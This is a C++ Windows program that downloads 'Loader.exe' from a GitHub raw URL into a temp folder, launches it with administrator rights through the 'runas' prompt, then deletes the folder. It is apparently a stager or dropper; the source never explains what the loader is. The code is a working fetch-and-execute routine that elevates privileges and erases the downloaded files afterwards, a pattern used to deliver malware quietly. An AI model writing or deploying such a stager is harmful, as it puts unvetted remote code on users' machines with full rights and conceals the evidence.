#include <windows.h>
#include <urlmon.h>
#include <string>
#include <iostream>

#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")

bool DownloadFile(const wchar_t* url, const std::wstring& outputPath) {
    HRESULT hr = URLDownloadToFileW(nullptr, url, outputPath.c_str(), 0, nullptr);
    return SUCCEEDED(hr);
}

HANDLE RunAsAdmin(const std::wstring& path, const std::wstring& workingDir) {
    SHELLEXECUTEINFOW sei = { sizeof(sei) };
    sei.lpVerb        = L"runas";
    sei.lpFile        = path.c_str();
    sei.lpDirectory   = workingDir.c_str();
    sei.nShow         = SW_SHOW;
    sei.fMask         = SEE_MASK_NOCLOSEPROCESS;

    if (ShellExecuteExW(&sei))
        return sei.hProcess;
    return nullptr;
}

void DeleteDir(const std::wstring& dir) {
    std::wstring pattern = dir + L"\\*";
    WIN32_FIND_DATAW fd;
    HANDLE hFind = FindFirstFileW(pattern.c_str(), &fd);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            std::wstring name = fd.cFileName;
            if (name == L"." || name == L"..") continue;
            std::wstring full = dir + L"\\" + name;
            SetFileAttributesW(full.c_str(), FILE_ATTRIBUTE_NORMAL);
            DeleteFileW(full.c_str());
        } while (FindNextFileW(hFind, &fd));
        FindClose(hFind);
    }
    SetFileAttributesW(dir.c_str(), FILE_ATTRIBUTE_NORMAL);
    RemoveDirectoryW(dir.c_str());
}

int main() {
    std::cout << "starting" << std::endl;

    // Build working directory in temp
    wchar_t tempBuf[MAX_PATH];
    GetTempPathW(MAX_PATH, tempBuf);
    std::wstring workDir   = std::wstring(tempBuf) + L"\\ldr_temp";
    std::wstring loaderPath = workDir + L"\\Loader.exe";

    CreateDirectoryW(workDir.c_str(), nullptr);

    // Download only Loader.exe
    if (!DownloadFile(L"https://github.com/IsaiahNulled/Needed/raw/refs/heads/main/Loader/Loader.exe", loaderPath)) {
        DeleteDir(workDir);
        return 1;
    }

    // Launch Loader.exe as admin from the working directory
    HANDLE hProc = RunAsAdmin(loaderPath, workDir);
    if (!hProc) {
        DeleteDir(workDir);
        return 1;
    }

    // Wait for loader to initialize then clean up
    WaitForInputIdle(hProc, 5000);
    CloseHandle(hProc);

    Sleep(3000);
    DeleteDir(workDir);

    return 0;
}
